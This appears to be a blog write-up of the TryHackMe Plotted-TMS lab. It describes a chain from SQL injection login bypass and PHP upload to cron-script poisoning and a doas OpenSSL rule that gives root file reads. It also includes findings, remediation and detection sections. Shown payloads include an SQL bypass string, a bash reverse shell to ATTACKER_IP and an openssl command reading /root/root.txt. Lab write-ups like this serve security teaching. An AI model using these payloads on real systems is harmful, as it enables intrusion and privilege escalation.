---
title: "TryHackMe: Plotted-TMS"
date: 2026-02-07 23:45:00 +0100
categories: [TryHackMe]
tags:
  - linux
  - web
  - sql-injection
  - file-upload
  - php
  - cron
  - doas
  - openssl
  - privilege-escalation
description: >-
  Plotted-TMS chains SQL injection authentication bypass, unrestricted PHP
  upload, cron-script poisoning, and an unsafe doas OpenSSL rule into
  complete compromise of the target trust boundary.
author: lenovolegion7
media_subpath: /images/tryhackme_plotted_tms
image:
  path: room_image.webp
  alt: "Original TryHackMe Plotted-TMS room artwork"
toc: true
comments: false
---

Plotted-TMS is a Linux web-to-root challenge built around an insecure Traffic Offense Management System, weak file-upload controls, unsafe cron trust, and overly broad `doas` delegation. The validated path progressed from an unauthenticated SQL injection to `www-data`, then to `plot_admin` through a cron-consumed backup script, and finally to protected root data through passwordless OpenSSL execution.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Plotted-TMS room card](room_card.webp){: w="302" h="264" .shadow }](https://tryhackme.com/room/plottedtms){: .center }

## Executive Summary

The target exposed SSH and two HTTP services during enumeration:

```text
22/tcp   SSH
80/tcp   HTTP
445/tcp  HTTP / Apache
```

The exploitable Traffic Offense Management System was served from TCP/445.

The validated compromise path was:

1. enumerate both HTTP services;
2. identify decoy content on TCP/80 and the real management application on TCP/445;
3. discover `/management`;
4. bypass the administrative login with SQL injection in the username field;
5. access the administration interface;
6. abuse the System Logo upload to place executable PHP content;
7. trigger the uploaded payload and obtain a shell as `www-data`;
8. identify `/var/www/scripts/backup.sh` as part of a recurring cron workflow;
9. replace the script with a controlled command;
10. wait for cron execution and obtain a shell as `plot_admin`;
11. retrieve the user objective;
12. identify a `doas` rule permitting `plot_admin` to execute OpenSSL as root;
13. abuse OpenSSL's arbitrary file access to read the protected root objective;
14. confirm that the same trust failure exposed broader root-level file access.

> **Result:** Unauthenticated web access was converted into host compromise through SQL injection, executable file upload, cron-script poisoning, and an unsafe root-level `doas` rule.
{: .prompt-danger }

## Scope and Safety Context

This assessment was performed only against the authorized TryHackMe Plotted-TMS laboratory target.

Testing was limited to the assigned machine and challenge objectives. Denial-of-service testing and activity outside the lab were excluded. The public writeup does not publish target addresses, attacker callback addresses, credentials, or challenge proof values.

## Initial Enumeration

Representative discovery:

```console
$ nmap \
  -p22,80,445 \
  -sV -sC -T4 -Pn \
  TARGET_IP
```

Observed attack surface:

```text
22/tcp   SSH
80/tcp   HTTP
445/tcp  Apache HTTP
```

TCP/80 presented default/decoy web content, while the Traffic Offense Management System was reachable through TCP/445.

## Decoy Web Content on TCP/80

Directory enumeration on TCP/80 exposed paths such as:

```text
/admin
/passwd
/shadow
```

The content was encoded or intentionally misleading and did not yield usable credentials.

One of the decoy pages suggested focusing on SSH rather than treating the exposed content as real account material.

## TOMS Discovery on TCP/445

Directory enumeration on the second HTTP service identified:

```text
/management
```

The application identified itself as a Traffic Offense Management System and exposed an administrative login workflow.

A footer reference also exposed the application author/user string:

```text
oretnom23
```

This provided context but was not itself sufficient for authentication.

## SQL Injection Authentication Bypass

The administrative login was vulnerable to SQL injection in the username field.

A representative bypass was:

```text
admin' OR 1=1 -- -
```

Using an arbitrary password value with the injected username authenticated to the first matching account, which provided access to the administrative interface.

**Root cause:** attacker-controlled data was incorporated into an authentication query without safe parameterization.

## Unrestricted PHP File Upload

The administrative Settings functionality allowed a System Logo to be uploaded without sufficiently restricting executable file types.

A PHP payload could be written into the web-accessible uploads directory:

```text
/management/uploads/
```

After the application update, requesting the uploaded PHP content produced command execution as:

```text
www-data
```

This established the initial operating-system foothold.

## Cron-Script Poisoning to plot_admin

Local enumeration identified the backup workflow:

```text
/var/www/scripts/backup.sh
```

The script was consumed by a recurring cron job running under:

```text
plot_admin
```

The lower-privileged web context could replace the backup script with controlled shell content.

Representative concept:

```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'
```

After the next cron execution, the resulting shell ran as:

```text
plot_admin
```

The user objective was located at:

```text
/home/plot_admin/user.txt
```

Its value is redacted:

```text
[REDACTED]
```

## doas OpenSSL Privilege Boundary

The host contained a `doas` configuration granting:

```text
permit nopass plot_admin as root cmd openssl
```

OpenSSL is a general-purpose utility capable of reading arbitrary files when executed with root privileges.

The validated challenge objective could be read with:

```console
$ doas -u root \
  openssl enc \
  -in /root/root.txt
```

The protected root proof is intentionally redacted:

```text
[REDACTED]
```

The same overly broad delegation represented a full root trust-boundary failure because OpenSSL can interact with arbitrary files under the delegated root context.

## Findings

### F-01 - SQL Injection Authentication Bypass

- **Severity:** Critical
- **Affected component:** TOMS administrative login
- **Impact:** unauthenticated administrative access

The login flow accepted an SQL injection payload in the username field and allowed authentication without valid credentials.

**Remediation:**

- use prepared statements and bound parameters;
- validate authentication inputs server-side;
- use uniform authentication failure responses;
- log and alert on SQL metacharacters in login requests.

### F-02 - Unrestricted Executable File Upload

- **Severity:** Critical
- **Affected component:** System Logo upload
- **Affected path:** `/management/uploads/`
- **Impact:** remote code execution as `www-data`

The application accepted executable PHP content and stored it in a web-accessible execution path.

**Remediation:**

- use strict extension allow-lists;
- validate MIME type and file signature;
- store uploads outside the web root;
- generate random server-side filenames;
- disable script execution in upload directories.

### F-03 - Writable Cron Script Executed as plot_admin

- **Severity:** High
- **Affected file:** `/var/www/scripts/backup.sh`
- **Impact:** privilege escalation from `www-data` to `plot_admin`

A lower-trust account could replace script content later executed by cron under a more privileged account.

**Remediation:**

- make cron scripts owner-writable only by the intended privileged account;
- use root-owned directories for automation;
- monitor script integrity;
- avoid executing content from web-writable locations.

### F-04 - Unsafe doas Rule for OpenSSL

- **Severity:** Critical
- **Affected account:** `plot_admin`
- **Rule:** `permit nopass plot_admin as root cmd openssl`
- **Impact:** root-level arbitrary file access and full privilege-boundary failure

The rule delegated a general-purpose file-processing utility with root privileges and no password requirement.

**Remediation:**

- remove passwordless root OpenSSL execution;
- expose only the exact required administrative action through a root-owned wrapper;
- restrict arguments;
- audit `doas` and sudo rules against known file-read/write and shell-escape capabilities.

## Security Impact

The validated chain resulted in complete compromise of the host security boundary.

An attacker with equivalent access could:

- bypass the web application's administrative authentication;
- upload executable server-side content;
- obtain an interactive shell as the web account;
- replace a cron-consumed script;
- move laterally to `plot_admin`;
- read root-protected files through delegated OpenSSL;
- potentially modify sensitive root-owned account and configuration files.

The compromise required no legitimate application credential.

## Detection Opportunities

Useful monitoring controls include:

- alert on SQL injection patterns in administrative login requests;
- monitor PHP creation inside `/management/uploads/`;
- alert on web-server child processes spawning shells;
- monitor changes to `/var/www/scripts/backup.sh`;
- correlate web-account file modification with subsequent cron execution;
- monitor `doas` execution of OpenSSL;
- alert on OpenSSL reading sensitive paths such as `/root`, `/etc/passwd`, or `/etc/shadow`;
- monitor unexpected changes to root-owned authentication files.

## Remediation Priorities

1. Fix SQL injection in the TOMS administrative login.
2. Remove executable upload capability from the System Logo workflow.
3. Move uploads outside the web root.
4. Correct ownership and permissions on `/var/www/scripts/backup.sh`.
5. Remove the root OpenSSL `doas` rule.
6. Rotate any credentials or keys accessible after compromise.
7. Add file-integrity monitoring for cron scripts.
8. Review all `doas` and sudo delegation for general-purpose utilities.
9. Remove unnecessary decoy/test content from public web roots.

## Retest Plan

1. Confirm SQL injection payloads no longer bypass the management login.
2. Verify executable PHP files cannot be uploaded or executed.
3. Confirm uploaded content is stored outside executable web paths.
4. Verify `www-data` cannot modify or replace `/var/www/scripts/backup.sh`.
5. Confirm cron no longer executes lower-trust controlled content as `plot_admin`.
6. Verify `plot_admin` no longer has passwordless root OpenSSL execution.
7. Confirm OpenSSL cannot be used to read `/root/root.txt` through `doas`.
8. Verify privileged account files cannot be modified through the previous delegation path.
9. Confirm the full previous chain no longer crosses from unauthenticated web access to privileged host access.

## Lessons Learned

Plotted-TMS demonstrates how ordinary web and operating-system trust mistakes can chain into a complete compromise.

SQL injection removed the authentication boundary, executable file upload converted administrative access into command execution, cron consumed lower-trust script content under another identity, and a broadly delegated file-processing utility collapsed the final root boundary.

The strongest defensive response is to treat authentication queries, upload handling, cron-script ownership, and privileged command delegation as one connected security boundary.
